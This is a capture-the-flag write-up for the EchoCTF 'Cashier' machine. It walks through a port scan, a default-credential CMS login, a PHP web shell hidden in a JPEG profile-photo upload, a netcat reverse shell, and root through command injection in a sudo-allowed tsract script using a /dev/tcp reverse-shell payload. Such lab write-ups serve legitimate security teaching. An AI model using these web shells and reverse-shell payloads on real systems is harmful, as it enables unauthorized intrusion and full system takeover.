# Cashier Writeup  for EchoCTF

In this writeup, we will be walking through the steps to exploit a vulnerable CMS and escalate privileges to root on Cashier in EchoCTF.

### Step One: Port Discovery

We use [Nmap](https://nmap.org/) to scan the open ports 

```
nmap -p1-10000 -sCV -n -Pn -v [TARGET_IP] 
```

*p1-10000: Scans ports 1 through 10,000.
sCV: Combines service detection (-sV) with default script scans (-sC) to enumerate service versions and vulnerabilities.
n: Skips DNS resolution for faster scanning.
Pn: Treats the target as online without pinging, useful for firewalled hosts.*


![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/nmap%20result1.png)

We see port **22** (SSH) and port **80** (HTTP)

### Step Two: Getting In

We visit the http website (port 80)
We are prompted to the login page for the CMS

```
http://[TARGET_IP]/login.php
```

Now, we need to find the default username and password for the cms which is easy through a quick online search *(or brute force it, but in this situation it is not needed)*

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/loginSukses.png)



After finding the login credentials and logging into the CMS, we go to the profile section

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/profile1.png)

`http://[TARGET_IP]/index.php?page=user`

#### Step Three: Exploit the CMS

Then, we need to open [BurpSuite](https://portswigger.net/burp)

Select a JPEG image ***(The image has to be JPEG, PNG won't work in this scenario)*** and insert it.

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/profile2.png)

Capture the upload request that is sent by clicking **Ganti Foto**.

Insert a php script into your image that will enable you to get a reverse shell.  
For example:

```php
 <?php system ($_GET['cmd']) ?>
 ```
 or

 ```php
 <?php passthru($_GET['cmd']); __halt_compiler(); ?>
 ```

It should look something like this

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/get%20cmd%20shell.png)

After this, we should see that our image has actually been uploaded to the server

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/success-edit-data.png)

Another indicator that the image has been successfully uploaded will be seeing this:

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/proof%20that%20shell%20is%20uploaded.png)

***The image will be stored with a random number before the name we set, so to find it we need to inspect the page  (Ctrl+Shift+C)***

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/shell%20location.png)

Now, we need to set up a reverse shell, which is done like this:

Open the bash console and type

```nc -nlvp [YOUR_PORT]```

Then, in the url of the image (*which can be copy+pasted from the page source*), we insert this payload to get a reverse shell    

` cmd= nc -e /bin/bash [YOUR_IP] [YOUR_PORT]`

After we've successfully created a reverse shell, we need to see how we can escalate our privileges to root.

### Step Four: Getting Root

if we run 
`sudo -l`

the server returns a script

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/sudoL.png)

Searching online for a tsract (tesseract) exploit, we find that it is vulnerable to arbitrary code execution via the child_process function due to improper input sanitization.
We can leverage this for privilege escalation.

I wrote a simple bash script for this:

`sudo /usr/local/bin/tsract "; bash -c 'bash -i >& /dev/tcp/[YOUR_IP]/[YOUR_PORT] 0>&1'; #"`

***The underlying cause of the vulnerability can be researched further online for detailed technical insights. TL;DR is that the package uses child_process (e.g., exec() or spawn()) to execute Tesseract commands. It appends the image filename provided by the user directly to the command without sanitization.***

The script basically creates a new connection to our machine as root, so we use [netcat](https://netcat.sourceforge.net/) to do this, in a similar fashion to how we did before.

In the new netcat window, we should see a connection like this:

![](https://raw.githubusercontent.com/CyberSpokes/writeups/refs/heads/main/cashier/images/root.png)

And we have root! 

### Final Thoughts

This challenge highlighted the importance of understanding how misconfigurations and input sanitization flaws can expose systems to serious risks. By systematically identifying vulnerabilities, and leveraging known exploits, we were able to gain root access on the target system.
From a defensive standpoint, implementing strong security practices such as restricting permissions, sanitizing inputs, and disabling unnecessary services, can greatly reduce the attack surface.

While this challenge was completed in a controlled environment, similar techniques could have devastating effects on real-world systems. Ethical hacking and responsible disclosure are key to ensuring such vulnerabilities are mitigated before they are exploited by malicious actors.

PS: 
```
[YOUR_IP]= Your VPN IP 
[YOUR_PORT]= Custom port to use for netcat
[TARGET_IP]= IP of the machine you are hacking 
```
